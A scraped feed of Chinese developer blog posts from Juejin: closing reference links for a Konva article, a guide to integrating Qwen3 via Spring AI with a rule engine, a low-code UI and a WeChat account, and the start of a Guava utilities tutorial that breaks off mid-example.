<li>指针相对缩放（官方示例）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fkonvajs.org%2Fdocs%2Fsandbox%2FZooming_Relative_To_Pointer.html" target="_blank" title="https://konvajs.org/docs/sandbox/Zooming_Relative_To_Pointer.html" ref="nofollow noopener noreferrer">konvajs.org/docs/sandbo…</a></li>
<li>vue-konva README（前缀 / 获取 Stage 引用）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkonvajs%2Fvue-konva%2Fblob%2Fmaster%2FREADME.md" target="_blank" title="https://github.com/konvajs/vue-konva/blob/master/README.md" ref="nofollow noopener noreferrer">github.com/konvajs/vue…</a></li>
<li>StackOverflow：通过 <code>ref</code> 获取 Stage：<a href="https://link.juejin.cn?target=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F58411623%2Fkonvajs-vuejs-how-to-access-stage-width-in-vue" target="_blank" title="https://stackoverflow.com/questions/58411623/konvajs-vuejs-how-to-access-stage-width-in-vue" ref="nofollow noopener noreferrer">stackoverflow.com/questions/5…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[首发实战！Spring AI + Qwen3 阿里大模型接入 TARE 项目 + TRAE SOLO 全流程指南]]></title>    <link>https://juejin.cn/post/7575413146922352655</link>    <guid>https://juejin.cn/post/7575413146922352655</guid>    <pubDate>2025-11-24T01:38:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575413146922352655" data-draft-id="7576077034741579810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="首发实战！Spring AI + Qwen3 阿里大模型接入 TARE 项目 + TRAE SOLO 全流程指南"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2025-11-24T01:38:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="天天摸鱼的java工程师"/> <meta itemprop="url" content="https://juejin.cn/user/3109843365802925"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            首发实战！Spring AI + Qwen3 阿里大模型接入 TARE 项目 + TRAE SOLO 全流程指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3109843365802925/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    天天摸鱼的java工程师
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T01:38:26.000Z" title="Mon Nov 24 2025 01:38:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🚀 <strong>首发实战！Spring AI + Qwen3 阿里大模型接入 TARE 项目 + TRAE SOLO 全流程指南</strong></h2>
<blockquote>
<p>🧑‍💻 作者：# 天天摸鱼的java工程师<br/>
🏆 项目投稿：TRAE SOLO 技术大奖赛<br/>
📌 关键词：Spring AI、Qwen3、大模型、TRAE、TARE、公众号接入、全栈实践</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">🧠 背景：大模型很火，但接入业务才是关键</h3>
<p>作为一名写了 8 年 Java 的开发者，我对“新技术”一直保持谨慎乐观的态度。大模型火了这么久，从最开始写玩具聊天到现在落地业务，<strong>真正能跑在生产环境里的项目，还不多。</strong></p>
<p>这次我选择从我们内部的 <strong>TARE 项目</strong> 下手，尝试把 <strong>阿里 Qwen3 大模型</strong> 通过 <strong>Spring AI</strong> 接入系统，同时通过 <strong>TRAE SOLO</strong> 构建业务流程 UI，最终做到：</p>
<blockquote>
<p><strong>从模型接入 ➡️ 业务集成 ➡️ 公众号对接，一套完整闭环流程。</strong></p>
</blockquote>
<p>并将其作为参赛项目，提交给 <strong>TRAE SOLO 技术大奖赛</strong>。</p>
<hr/>
<h3 data-id="heading-2">📦 项目目标：三步走</h3>
<h4 data-id="heading-3">✅ Step 1：使用 Spring AI 接入阿里 Qwen3 模型</h4>
<h4 data-id="heading-4">✅ Step 2：将模型能力集成到 TARE 项目中（规则生成、任务建议）</h4>
<h4 data-id="heading-5">✅ Step 3：通过 TRAE SOLO 构建前端页面，打通公众号接口，实现问答服务</h4>
<hr/>
<h3 data-id="heading-6">🧰 技术栈选型</h3>





























<table><thead><tr><th>模块</th><th>技术方案</th></tr></thead><tbody><tr><td>大模型接入</td><td>Spring AI + Qwen3 (阿里通义千问)</td></tr><tr><td>后端框架</td><td>Spring Boot 3 + WebFlux</td></tr><tr><td>页面编排</td><td>TRAE SOLO（低代码拖拽 UI + 接口绑定）</td></tr><tr><td>消息平台</td><td>微信公众号 + 自建服务路由</td></tr><tr><td>项目模块</td><td>TARE（流程自动化规则系统）</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-7">🛠 实战细节拆解</h3>
<hr/>
<h4 data-id="heading-8">✅ 一、Spring AI + Qwen3 模型接入配置</h4>
<p>Spring AI 作为 Spring 官方推出的大模型集成框架，接入阿里 Qwen3 非常顺滑。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">ai:</span>
    <span class="hljs-attr">openai:</span>
      <span class="hljs-attr">base-url:</span> <span class="hljs-string">https://dashscope.aliyuncs.com/compatible-mode/v1</span>
      <span class="hljs-attr">api-key:</span> <span class="hljs-string">${ALI_API_KEY}</span>
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">OpenAiChatClient</span> <span class="hljs-title function_">chatClient</span>(<span class="hljs-params">OpenAiApi openAiApi</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAiChatClient</span>(openAiApi);
}
</code></pre>
<p><strong>接口封装：</strong></p>
<pre><code class="hljs language-scss" lang="scss">public String <span class="hljs-built_in">askQwen</span>(String question) {
    ChatRequest request = ChatRequest<span class="hljs-selector-class">.builder</span>()
        <span class="hljs-selector-class">.model</span>("qwen-plus")
        <span class="hljs-selector-class">.messages</span>(List.of(ChatMessage.userMessage(question)))
        <span class="hljs-selector-class">.build</span>();

    ChatResponse response = chatClient<span class="hljs-selector-class">.call</span>(request);
    return response<span class="hljs-selector-class">.getResult</span>()<span class="hljs-selector-class">.getOutput</span>()<span class="hljs-selector-class">.getChoices</span>()<span class="hljs-selector-class">.get</span>(<span class="hljs-number">0</span>)<span class="hljs-selector-class">.getMessage</span>()<span class="hljs-selector-class">.getContent</span>();
}
</code></pre>
<hr/>
<h4 data-id="heading-9">✅ 二、TARE 项目中引入模型能力</h4>
<p>TARE 本身是一个规则驱动的业务引擎，之前规则配置主要靠人工设置。</p>
<p>这次我新增了一个模块： <strong>“AI 智能推荐规则”</strong></p>
<h5 data-id="heading-10">👇 使用方式：</h5>
<ol>
<li>用户在 TRAE 页面上选择“生成规则建议”</li>
<li>输入业务场景（如“客户投诉自动分配”）</li>
<li>后端将场景描述传给 Qwen3</li>
<li>模型返回规则草案（JSON 格式）</li>
<li>用户可一键导入至现有流程中</li>
</ol>
<h5 data-id="heading-11">示例对话：</h5>
<blockquote>
<p>用户输入：<br/>
“我想自动将 VIP 投诉分配给一线客服，普通客户则进入普通队列。”</p>
</blockquote>
<blockquote>
<p>模型返回：</p>
</blockquote>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"规则条件"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"用户等级 == VIP"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"执行动作"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"任务分配至高级客服组"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"否则"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"任务进入普通审核流程"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>👉 用户点击“导入”后，规则自动写入 TARE 流程引擎，并通过 TRAE 页面实时生效。</strong></p>
<hr/>
<h4 data-id="heading-12">✅ 三、TRAE SOLO 页面搭建与交互细节</h4>
<h5 data-id="heading-13">页面结构：</h5>





















<table><thead><tr><th>区域</th><th>功能</th></tr></thead><tbody><tr><td>左侧导航</td><td>规则管理 / AI推荐 / 历史记录</td></tr><tr><td>中间主区</td><td>表单输入 + 模型返回内容</td></tr><tr><td>右侧</td><td>JSON 规则预览 + 一键导入按钮</td></tr></tbody></table>
<h5 data-id="heading-14">核心交互细节：</h5>
<ul>
<li>使用 <strong>表单组件</strong> 收集用户输入</li>
<li><strong>按钮事件绑定</strong> 后端接口 <code>/api/ai-suggest</code></li>
<li>接收模型返回后 <strong>自动填入右侧 JSON 区块</strong></li>
<li>“导入规则”按钮触发事件 -&gt; 调用 <code>/api/rules/import</code></li>
</ul>
<h5 data-id="heading-15">TRAE 配置亮点：</h5>
<ul>
<li>所有交互无须写前端代码，仅通过 <strong>事件配置 + 数据源绑定</strong> 完成</li>
<li>规则预览区使用 <strong>代码高亮组件</strong>，提升可读性</li>
<li>导入成功后自动通知用户并刷新流程图</li>
</ul>
<hr/>
<h4 data-id="heading-16">✅ 四、公众号接入：模型能力对外开放</h4>
<p>我们还将模型能力通过接口暴露给微信公众号，实现企业级对话式服务。</p>
<h5 data-id="heading-17">接入方案：</h5>
<ul>
<li>使用微信公众号开发者平台配置消息转发地址</li>
<li>后端接收用户文本消息，转发至 AI 接口</li>
<li>返回模型回答后回复文本消息</li>
</ul>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/wx/msg"</span>)
public String <span class="hljs-built_in">handleMessage</span>(<span class="hljs-variable">@RequestBody</span> WxMessage message) {
    <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">reply</span> = <span class="hljs-selector-tag">askQwen</span>(message.<span class="hljs-built_in">getContent</span>());
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">buildWxTextResponse</span>(message, reply);
}
</code></pre>
<p><strong>实际用例：</strong><br/>
用户发送“请帮我写一个客户投诉分配规则”，公众号自动返回 JSON 格式建议，供运营参考。</p>
<hr/>
<h3 data-id="heading-18">🔁 总结：这次集成带给我的三点收获</h3>
<h4 data-id="heading-19">1. <strong>模型能力不再是“玩具”，开始成为业务加速器</strong></h4>
<p>它可以真正为我们节省配置时间、提供可参考的业务建议。</p>
<h4 data-id="heading-20">2. <strong>TRAE SOLO 让我把后端的能力延伸到了 UI 层</strong></h4>
<p>我能控制页面、配置流程、调用接口，<strong>不再依赖前端，也不担心交互落地不了。</strong></p>
<h4 data-id="heading-21">3. <strong>TARE 项目因为 AI + TRAE 的组合，焕发了第二春</strong></h4>
<p>原本只能内部使用的规则配置系统，现在具备了对外服务的能力。</p>
<hr/>
<h3 data-id="heading-22">📢 写在最后：全栈不是“全都会”，而是“全能交付”</h3>
<p>我仍然是一名 Java 工程师，但现在我能：</p>
<ul>
<li>接入大模型</li>
<li>搭建前端页面</li>
<li>构建业务流程</li>
<li>对接公众号服务</li>
</ul>
<p>这不是因为我变成了全栈，而是因为我有了好工具，比如 Spring AI 和 TRAE SOLO。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Guava 常用工具包完全指南]]></title>    <link>https://juejin.cn/post/7575112613779046434</link>    <guid>https://juejin.cn/post/7575112613779046434</guid>    <pubDate>2025-11-24T01:39:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575112613779046434" data-draft-id="7575533124877582363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Guava 常用工具包完全指南"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2025-11-24T01:39:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sino爱学习"/> <meta itemprop="url" content="https://juejin.cn/user/1873223544473431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Guava 常用工具包完全指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223544473431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sino爱学习
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T01:39:50.000Z" title="Mon Nov 24 2025 01:39:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">简介</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/593643ad991e40af9dd060ca64ebf2cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2lub-eIseWtpuS5oA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764554040&amp;x-signature=aVm6ZvOQJVBAWs5YibLQAg0QOYk%3D" alt="1763948312527.png" loading="lazy"/></p>
<p>Guava 是 Google 开源的 Java 核心库，提供了丰富的工具类和集合框架，能够极大提升开发效率。本文将介绍 Guava 中最常用的工具包及其实际应用。</p>
<h2 data-id="heading-1">1. 集合工具 (Collections)</h2>
<h3 data-id="heading-2">1.1 不可变集合</h3>
<p>不可变集合线程安全且不可修改，适合作为常量使用。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建不可变 List</span>
ImmutableList&lt;String&gt; list = ImmutableList.of(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);

<span class="hljs-comment">// 创建不可变 Set</span>
ImmutableSet&lt;Integer&gt; set = ImmutableSet.of(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>);

<span class="hljs-comment">// 创建不可变 Map</span>
ImmutableMap&lt;String, Integer&gt; map = ImmutableMap.of(
    <span class="hljs-string">"Java"</span>, <span class="hljs-number">1</span>,
    <span class="hljs-string">"Python"</span>, <span class="hljs-number">2</span>,
    <span class="hljs-string">"Go"</span>, <span class="hljs-number">3</span>
);

<span class="hljs-comment">// 使用 Builder 构建复杂集合</span>
ImmutableList&lt;String&gt; complexList = ImmutableList.&lt;String&gt;builder()
    .add(<span class="hljs-string">"A"</span>)
    .add(<span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
    .addAll(Arrays.asList(<span class="hljs-string">"D"</span>, <span class="hljs-string">"E"</span>))
    .build();
</code></pre>
<h3 data-id="heading-3">1.2 Multiset - 计数集合</h3>
<p>Multiset 允许元素重复，并可以统计元素出现次数。</p>
<pre><code class="hljs language-java" lang="java">Multiset&lt;String&gt; multiset = HashMultiset.create();
multiset.add(<span class="hljs-string">"apple"</span>);
multiset.add(<span class="hljs-string">"apple"</span>);
multiset.add(<span class="hljs-string">"banana"</span>);
multiset.add(<span class="hljs-string">"apple"</span>);

System.out.println(multiset.count(<span class="hljs-string">"apple"</span>));  <span class="hljs-comment">// 输出: 3</span>
System.out.println(multiset.size());          <span class="hljs-comment">// 输出: 4</span>

<span class="hljs-comment">// 遍历不重复元素</span>
<span class="hljs-keyword">for</span> (String element : multiset.elementSet()) {
    System.out.println(element + <span class="hljs-string">": "</span> + multiset.count(element));
}
</code></pre>
<h3 data-id="heading-4">1.3 Multimap - 一键多值映射</h3>
<p>Multimap 允许一个键对应多个值。</p>
<pre><code class="hljs language-java" lang="java">Multimap&lt;String, String&gt; multimap = ArrayListMultimap.create();
multimap.put(<span class="hljs-string">"Fruit"</span>, <span class="hljs-string">"Apple"</span>);
multimap.put(<span class="hljs-string">"Fruit"</span>, <span class="hljs-string">"Banana"</span>);
multimap.put(<span class="hljs-string">"Vegetable"</span>, <span class="hljs-string">"Carrot"</span>);

System.out.println(multimap.get(<span class="hljs-string">"Fruit"</span>));  <span class="hljs-comment">// 输出: [Apple, Banana]</span>

<span class="hljs-comment">// 转换为普通 Map</span>
Map&lt;String, Collection&lt;String&gt;&gt; map = multimap.asMap();
</code></pre>
<h3 data-id="heading-5">1.4 BiMap - 双向映射</h3>
<p>BiMap 提供键值互查的双向映射。</p>
<pre><code class="hljs language-java" lang="java">BiMap&lt;String, Integer&gt; biMap = HashBiMap.create();
biMap.put(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">1</span>);
biMap.put(<span class="hljs-string">"Bob"</span>, <span class="hljs-number">2</span>);

<span class="hljs-comment">// 正向查询</span>
System.out.println(biMap.get(<span class="hljs-string">"Alice"</span>));  <span class="hljs-comment">// 输出: 1</span>

<span class="hljs-comment">// 反向查询</span>
System.out.println(biMap.inverse().get(<span class="hljs-number">1</span>));  <span class="hljs-comment">// 输出: Alice</span>
</code></pre>
<h3 data-id="heading-6">1.5 Table - 双键映射</h3>
<p>Table 提供行列式的双键映射结构。</p>
<pre><code class="hljs language-java" lang="java">Table&lt;String, String, Integer&gt; table = HashBasedTable.create();
table.put(<span class="hljs-string">"2023"</span>, <span class="hljs-string">"Q1"</span>, <span class="hljs-number">100</span>);
table.put(<span class="hljs-string">"2023"</span>, <span class="hljs-string">"Q2"</span>, <span class="hljs-number">150</span>);
table.put(<span class="hljs-string">"2024"</span>, <span class="hljs-string">"Q1"</span>, <span class="hljs-number">120</span>);

<span class="hljs-comment">// 获取值</span>
<span class="hljs-type">Integer</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> table.get(<span class="hljs-string">"2023"</span>, <span class="hljs-string">"Q1"</span>);  <span class="hljs-comment">// 100</span>

<span class="hljs-comment">// 获取某一行的所有数据</span>
Map&lt;String, Integer&gt; row = table.row(<span class="hljs-string">"2023"</span>);  <span class="hljs-comment">// {Q1=100, Q2=150}</span>

<span class="hljs-comment">// 获取某一列的所有数据</span>
